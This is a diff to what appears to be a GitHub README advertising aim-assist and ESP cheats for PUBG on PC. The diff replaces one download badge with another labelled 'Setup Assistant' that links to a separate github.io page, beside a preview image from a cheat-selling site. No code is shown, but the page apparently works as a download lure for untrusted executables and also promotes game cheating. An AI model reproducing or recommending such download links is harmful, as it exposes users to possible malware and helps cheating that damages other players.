@@ -4,12 +4,7 @@
 
 <h1 align="center">🎯 PUBG Aim Assist and ESP Tools for PC </h1>
 
-<p align="center">
-  <a href="https://pubg-aim-assist-and-esp-tools.github.io/.github/" target="_blank">
-    <img src="https://img.shields.io/badge/⬇️%20Download%20PUBG%20Aim%20Assist%20and%20ESP-Windows%20Version-1E90FF?style=for-the-badge&logo=windows&logoColor=white" 
-         alt="Download PUBG Aim Assist and ESP Tools" style="width:540px; height:37px;" />
-  </a>
-</p>
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-lightgrey)](https://irinaluzanova948.github.io/.github/pubg-assist-and-tools)
 
 <p align="center">
   <img src="https://www.skycheats.com/uploads/monthly_2024_06/4.webp.a9a836b4784bf518ceb29b51eff5d72a.webp" alt="PUBG Aim Assist and ESP Tools Preview" width="800" />
